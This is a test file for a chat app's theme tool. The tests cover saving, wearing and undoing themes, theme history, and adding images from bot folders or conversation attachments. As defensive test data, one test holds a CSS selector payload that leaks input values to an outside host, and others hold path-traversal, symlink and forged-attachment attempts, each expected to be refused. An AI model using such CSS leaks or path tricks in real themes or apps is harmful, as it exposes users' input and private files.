import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { basename, join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";

import { createAppSettings } from "../app-settings/host.ts";
import { themeGuide } from "../../shared/theme.ts";
import { pictureKind } from "./store.ts";
import type { BotRecord } from "../store.ts";
import { createThemeStore } from "./store.ts";
import { createThemeTool } from "./tool.ts";

const PNG = Buffer.from("89504e470d0a1a0a0000000d49484452", "hex");
const JPG = (n: number) => Buffer.from([0xff, 0xd8, 0xff, 0xe0, n]);
const dirs: string[] = [];
afterEach(() => {
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true });
});

function fixture(options: { person?: string | null; guest?: boolean } = {}) {
  const root = mkdtempSync(join(tmpdir(), "theme-tool-"));
  dirs.push(root);
  const dataDir = join(root, "data");
  const workspace = join(root, "workspace");
  const outside = join(root, "outside");
  const attachments = join(root, "attachments");
  for (const dir of [dataDir, workspace, outside, attachments]) mkdirSync(dir, { recursive: true });
  const attached = join(attachments, "upload-1.png");
  writeFileSync(attached, PNG);
  writeFileSync(join(attachments, "someone-elses.png"), PNG);
  const attachedList = [{ path: attached, name: "upload-1.png" }];
  const messages: Array<Record<string, any>> = [];
  const bots = [{ id: "kiwi", name: "Kiwi", color: "green", threadId: "t-kiwi" } as unknown as BotRecord];
  const store = {
    appendMessage: (threadId: string, message: Record<string, unknown>) => {
      const row = { ...message, id: `m${messages.length + 1}`, threadId };
      messages.push(row);
      return row as never;
    },
    bot: (id: string) => bots.find((bot) => bot.id === id),
    messagesFor: (threadId: string) => messages.filter((message) => message.threadId === threadId) as never,
    patchMessage: (threadId: string, messageId: string, patch: Record<string, unknown>) => {
      Object.assign(messages.find((message) => message.threadId === threadId && message.id === messageId) ?? {}, patch);
      return null;
    },
  };
  const themes = createThemeStore({ dataDir });
  const changed: Array<{ person: string; skin?: string }> = [];
  const person = options.person === undefined ? "owner" : options.person;
  const host = createAppSettings({
    store: store as never, dataDir, entries: [],
    turnOwner: () => "owner", guestDriven: () => options.guest === true,
    requestCredential: async () => ({ status: 500, body: {} }), connectorThread: () => null, language: () => undefined,
    themes: createThemeTool({
      store: themes, person: () => person, changed: (who, skin) => changed.push({ person: who, ...(skin ? { skin } : {}) }),
      sources: () => ({ roots: [workspace], attachmentsDir: attachments, attachments: attachedList }),
    }),
  });
  const turn = { botId: "kiwi", threadId: "t-kiwi", generation: "gen-1" };
  const call = (body: Record<string, unknown>) => host.handle(body, turn);
  const undo = () => host.undo({ threadId: turn.threadId, requestId: String(messages.filter((m) => m.card?.appSettingRequest).at(-1)!.card.requestId) });
  /** Attaches a file to this conversation as the composer does: stored under an id, listed with the name it came with. */
  const attach = (bytes: Buffer, name: string, stored = `${attachedList.length}-${name.toLowerCase().replace(/[^a-z0-9.]/g, "")}`) => {
    const path = join(attachments, stored);
    writeFileSync(path, bytes);
    attachedList.push({ path, name });
    return path;
  };
  return { host, themes, changed, call, undo, messages, workspace, outside, attachments, attached, attach, attachedList, dataDir };
}

const NEON = { name: "Neon", canvas: "#0b1020", accent: "#ff2bd6", css: '[data-look="app"] { animation: glow 4s infinite; } @keyframes glow { to { filter: hue-rotate(40deg); } }' };

describe("app_settings theme actions", () => {
  it("reads the person's themes with the guide, and refuses a turn no one person began", async () => {
    const { call } = fixture();
    const read = await call({ action: "theme" });
    expect(read.status).toBe(200);
    const body = JSON.parse(String(read.body.text));
    expect(body.builtIn).toContain("midnight");
    expect(body.guide).toContain('[data-look="composer"]');
    expect((await fixture({ person: null }).call({ action: "theme" })).status).toBe(403);
    expect((await fixture({ guest: true }).call({ action: "set_theme", id: "midnight" })).status).toBe(403);
  });

  it("saves and wears a theme for that person only, with Undo putting the earlier theme back", async () => {
    const { call, themes, changed, undo, messages } = fixture();
    themes.save("owner", "calm", { name: "Calm" });
    themes.setActive("owner", "calm");
    const set = await call({ action: "set_theme", id: "neon", theme: JSON.stringify(NEON) });
    expect(set.status).toBe(200);
    expect(themes.list("owner").active).toBe("neon");
    expect(themes.read("owner", "neon")?.css).toContain("@keyframes glow");
    expect(changed).toEqual([{ person: "owner" }]);
    expect(messages.at(-1)!.card).toMatchObject({ appSettingRequest: { settingId: "appearance.theme", after: "Save the theme Neon and wear it" }, autoApplied: true });

    await call({ action: "set_theme", id: "neon", theme: JSON.stringify({ ...NEON, accent: "#00ff88" }) });
    expect(await undo()).toEqual({ claimed: true, state: "undone" });
    expect(themes.read("owner", "neon")?.accent).toBe("#ff2bd6");
    expect(await undo()).toEqual({ claimed: true, state: "already_undone" });
  });

  it("refuses a theme that would load from the internet and changes nothing", async () => {
    const { call, themes, changed } = fixture();
    const refused = await call({ action: "set_theme", id: "leak", theme: JSON.stringify({ name: "Leak", css: 'input[value^="a"] { background: url(https://example.com/?a) }' }) });
    expect(refused).toMatchObject({ status: 400, body: { error: expect.stringContaining("never the internet") } });
    expect(themes.list("owner")).toEqual({ active: null, themes: [] });
    expect(changed).toEqual([]);
    expect((await call({ action: "set_theme", id: "midnight", theme: JSON.stringify({ name: "Midnight" }) })).status).toBe(400);
  });

  it("switches to a built-in skin or to none", async () => {
    const { call, themes, changed } = fixture();
    themes.save("owner", "neon", { name: "Neon" });
    themes.setActive("owner", "neon");
    expect((await call({ action: "set_theme", id: "midnight" })).status).toBe(200);
    expect(themes.list("owner").active).toBeNull();
    expect(changed.at(-1)).toEqual({ person: "owner", skin: "midnight" });
    expect((await call({ action: "set_theme", id: "neon" })).status).toBe(200);
    expect(themes.list("owner").active).toBe("neon");
    expect((await call({ action: "set_theme", id: "none" })).status).toBe(200);
    expect(themes.list("owner").active).toBeNull();
    expect((await call({ action: "set_theme", id: "nope" })).status).toBe(400);
  });

  it("copies an image only from the bot's own folders or this conversation's attachments", async () => {
    const { call, themes, workspace, outside, attachments, attached } = fixture();
    themes.save("owner", "neon", { name: "Neon" });
    writeFileSync(join(workspace, "Stars Big.png"), PNG);
    writeFileSync(join(outside, "secret.png"), PNG);
    writeFileSync(join(workspace, "notes.png"), "not an image");
    symlinkSync(join(outside, "secret.png"), join(workspace, "link.png"));

    const added = await call({ action: "add_theme_asset", id: "neon", path: join(workspace, "Stars Big.png") });
    expect(added).toMatchObject({ status: 200, body: { text: expect.stringContaining('url("/api/theme-assets/neon/stars-big.png")') } });
    expect((await call({ action: "add_theme_asset", id: "neon", path: attached })).status).toBe(200);
    expect((await call({ action: "add_theme_asset", id: "neon", path: join(outside, "secret.png") })).status).toBeGreaterThanOrEqual(400);
    expect((await call({ action: "add_theme_asset", id: "neon", path: join(workspace, "link.png") })).status).toBeGreaterThanOrEqual(400);
    expect((await call({ action: "add_theme_asset", id: "neon", path: join(workspace, "..", "outside", "secret.png") })).status).toBeGreaterThanOrEqual(400);
    expect((await call({ action: "add_theme_asset", id: "neon", path: join(attachments, "someone-elses.png") })).status).toBeGreaterThanOrEqual(400);
    expect((await call({ action: "add_theme_asset", id: "neon", path: join(workspace, "notes.png") })).status).toBe(400);
    expect(themes.list("owner").themes[0]!.assets).toEqual(["stars-big.png", "upload-1.png"]);
    expect((await call({ action: "add_theme_asset", id: "midnight", path: join(workspace, "Stars Big.png") })).status).toBe(400);
  });

  it("lists the look changes and goes back by steps, by index and on its own undo, each with a card that has Undo", async () => {
    const { call, themes, changed, undo, messages } = fixture();
    const edit = (accent: string) => call({ action: "set_theme", id: "neon", theme: JSON.stringify({ ...NEON, accent }) });
    await edit("#ff2bd6");
    await edit("#00ff88");
    await edit("#8a2be2");
    await call({ action: "set_theme", id: "midnight" });
    const listed = JSON.parse(String((await call({ action: "theme_history" })).body.text));
    expect(listed.changes.map((change: { index: number; what: string }) => `${change.index} ${change.what}`)).toEqual(["1 wore the built-in midnight skin", "2 edited Neon", "3 edited Neon", "4 made Neon"]);
    expect(listed.changes[1].look).toEqual({ theme: "Neon", canvas: "#0b1020", accent: "#8a2be2" });

    expect((await call({ action: "undo_theme" })).body.text).toContain("Undo the last look change (wore the built-in midnight skin)");
    expect(themes.list("owner").active).toBe("neon");
    expect(changed.at(-1)).toEqual({ person: "owner", skin: "system" });
    expect(messages.at(-1)!.card.appSettingRequest).toMatchObject({ settingId: "appearance.theme", after: expect.stringContaining("Undo the last look change") });

    expect((await call({ action: "undo_theme", steps: "1" })).status).toBe(200);
    expect(themes.list("owner").active).toBeNull();
    expect(changed.at(-1)).toEqual({ person: "owner", skin: "midnight" });

    const history = JSON.parse(String((await call({ action: "theme_history" })).body.text)).changes;
    const green = history.find((change: { look: { accent?: string } }) => change.look.accent === "#00ff88");
    expect((await call({ action: "undo_theme", index: green.index })).status).toBe(200);
    expect(themes.read("owner", "neon")?.accent).toBe("#00ff88");
    expect(themes.list("owner").active).toBe("neon");

    expect((await call({ action: "undo_theme", steps: 2 })).status).toBe(200);
    expect(themes.read("owner", "neon")?.accent).toBe("#8a2be2");
    expect(themes.list("owner").active).toBe("neon");

    const purple = JSON.parse(String((await call({ action: "theme_history" })).body.text)).changes.find((change: { what: string; look: { accent?: string } }) => change.what === "made Neon");
    expect((await call({ action: "undo_theme", index: purple.index })).status).toBe(200);
    expect(themes.read("owner", "neon")?.accent).toBe("#ff2bd6");
    expect(await undo()).toEqual({ claimed: true, state: "undone" });
    expect(themes.read("owner", "neon")?.accent).toBe("#8a2be2");

    expect((await call({ action: "undo_theme", index: 1 })).body).toEqual({ error: "That is how it looks now." });
    expect((await call({ action: "undo_theme", steps: 99 })).status).toBe(400);
    expect((await fixture().call({ action: "undo_theme" })).status).toBe(400);
    expect((await fixture({ person: null }).call({ action: "undo_theme" })).status).toBe(403);
    expect((await fixture({ guest: true }).call({ action: "theme_history" })).status).toBe(403);
  });

  it("goes back to the default look with none, and that is a change undo goes back on", async () => {
    const { call, themes, changed } = fixture();
    await call({ action: "set_theme", id: "neon", theme: JSON.stringify(NEON) });
    expect((await call({ action: "set_theme", id: "none" })).status).toBe(200);
    expect(themes.list("owner").active).toBeNull();
    expect(changed.at(-1)).toEqual({ person: "owner" });
    expect(JSON.parse(String((await call({ action: "theme_history" })).body.text)).changes[0]).toMatchObject({ index: 1, what: "back to default", look: "default" });
    expect((await call({ action: "undo_theme" })).status).toBe(200);
    expect(themes.list("owner").active).toBe("neon");
  });

  it("takes a picture attached on this turn or earlier, by path, stored name or file name, or the latest one with no path", async () => {
    const { call, themes, workspace, attach, attachedList, messages, changed, undo } = fixture();
    const earlier = attach(JPG(1), "beach.jpg");
    attach(Buffer.from("%PDF-1.4"), "notes.pdf");

    // No custom theme worn and no id: one call makes a theme over the person's skin for the file, not worn yet.
    const first = await call({ action: "add_theme_asset" });
    expect(first).toMatchObject({ status: 200, body: { text: expect.stringContaining('url("/api/theme-assets/background/beach.jpg")') } });
    expect(first.body.text).toContain("Made the theme Background (id background)");
    expect(themes.list("owner")).toEqual({ active: null, themes: [{ id: "background", name: "Background", hasCss: false, assets: ["beach.jpg"] }] });
    expect(changed).toEqual([]);
    expect(messages.filter((m) => m.card)).toEqual([]);

    expect(first.body.text, "the reply carries the guide's picture recipe, so no guide read is needed").toContain(`url("/api/theme-assets/background/beach.jpg") center / cover no-repeat; }`);
    const veil = "color-mix(in srgb, var(--color-app) 62%, transparent)";
    expect(first.body.text).toContain(`linear-gradient(${veil}, ${veil})`);
    expect(themeGuide(), "the same veil as the guide's (palette.test.ts holds it readable)").toContain(`linear-gradient(${veil}, ${veil})`);
    // Asked again with nothing worn, the same unworn theme takes the file: no Background 2.
    expect((await call({ action: "add_theme_asset", path: "none" })).body.text).toContain("Added to the theme Background (id background)");
    expect(themes.list("owner").themes.map((theme) => theme.id)).toEqual(["background"]);

    // set_theme wears it, with the card and Undo.
    const css = '[data-look="chat-backdrop"] { background: url("/api/theme-assets/background/beach.jpg") center / cover; }';
    expect((await call({ action: "set_theme", id: "background", theme: JSON.stringify({ name: "Background", css }) })).status).toBe(200);
    expect(themes.list("owner").active).toBe("background");
    expect(messages.at(-1)!.card.appSettingRequest).toMatchObject({ settingId: "appearance.theme" });

    // Worn: no id means that theme. A bot box shows the upload under another folder: its stored name finds it; so does
    // the name it was attached under.
    const boxed = join(workspace, "..", "box-uploads", "kiwi", "t-kiwi", basename(earlier));
    expect((await call({ action: "add_theme_asset", path: boxed })).body.text).toContain("Added to the theme Background (id background)");
    const sunset = attach(PNG, "Sunset.PNG");
    expect((await call({ action: "add_theme_asset", path: "sunset.png" })).body.text).toContain("/background/sunset.png");
    expect((await call({ action: "add_theme_asset", path: earlier })).status).toBe(200);
    expect(themes.list("owner").themes[0]!.assets).toEqual(["beach.jpg", "sunset.png"]);
    expect(attachedList.map((one) => one.path)).toContain(sunset);

    // A second picture under a name the theme already has keeps its own name, so undo to the earlier look still shows
    // the earlier picture.
    attach(JPG(2), "beach.jpg");
    expect((await call({ action: "add_theme_asset" })).body.text).toMatch(/\/background\/beach-[0-9a-f]{6}\.jpg/);
    expect(themes.read("owner", "background")?.css).toBe(css);
    expect(await undo()).toEqual({ claimed: true, state: "undone" });
    expect(themes.list("owner").active).toBeNull();
  });

  it("opens an attachment only inside the attachment store and only from this conversation", async () => {
    const { call, themes, outside, attachments, attachedList } = fixture();
    themes.save("owner", "neon", { name: "Neon" });
    writeFileSync(join(outside, "secret.png"), PNG);
    // A tag in the person's own message is text: one naming a file outside the store opens nothing.
    attachedList.push({ path: join(outside, "secret.png"), name: "secret.png" });
    expect((await call({ action: "add_theme_asset", id: "neon", path: join(outside, "secret.png") })).status).toBeGreaterThanOrEqual(400);
    expect((await call({ action: "add_theme_asset", id: "neon", path: "secret.png" })).status).toBeGreaterThanOrEqual(400);
    writeFileSync(join(attachments, "other-chat.png"), PNG);
    expect((await call({ action: "add_theme_asset", id: "neon", path: "other-chat.png" })).status).toBeGreaterThanOrEqual(400);
    // With no path, the newest picture that opens: the forged one is skipped.
    expect((await call({ action: "add_theme_asset", id: "neon" })).body.text).toContain("/neon/upload-1.png");
    expect(themes.list("owner").themes[0]!.assets).toEqual(["upload-1.png"]);
  });

  it("names a HEIC photo and a file over the limit, and never uses an older picture in a HEIC's place", async () => {
    const { call, themes, workspace, attach } = fixture();
    const heic = Buffer.concat([Buffer.from([0, 0, 0, 24]), Buffer.from("ftypheic"), Buffer.from([0, 0, 0, 0]), Buffer.from("mif1heic"), Buffer.alloc(32)]);
    const avif = Buffer.concat([Buffer.from([0, 0, 0, 28]), Buffer.from("ftypavif"), Buffer.from([0, 0, 0, 0]), Buffer.from("avifmif1miaf"), Buffer.alloc(32)]);
    expect([pictureKind(heic), pictureKind(avif), pictureKind(PNG), pictureKind(JPG(1)), pictureKind(Buffer.from("<svg xmlns='http://www.w3.org/2000/svg'/>"))]).toEqual(["heic", "avif", "png", "jpg", "svg"]);
    attach(heic, "IMG_0042.HEIC", "1-img.bin");
    expect((await call({ action: "add_theme_asset" })).body.error).toMatch(/^That is a HEIC photo.*sips -s format jpeg/);
    expect((await call({ action: "add_theme_asset", path: "IMG_0042.HEIC" })).body.error).toMatch(/HEIC/);
    // Named .avif but HEIC inside: refused by its bytes.
    writeFileSync(join(workspace, "fake.avif"), heic);
    expect((await call({ action: "add_theme_asset", path: join(workspace, "fake.avif") })).status).toBe(400);
    writeFileSync(join(workspace, "huge.png"), Buffer.concat([PNG, Buffer.alloc(10 * 1024 * 1024)]));
    expect(await call({ action: "add_theme_asset", path: join(workspace, "huge.png") })).toMatchObject({ status: 413, body: { error: expect.stringMatching(/^A theme file may be up to 10 MB\..*sips/) } });
    expect(themes.list("owner").themes).toEqual([]);
  });
});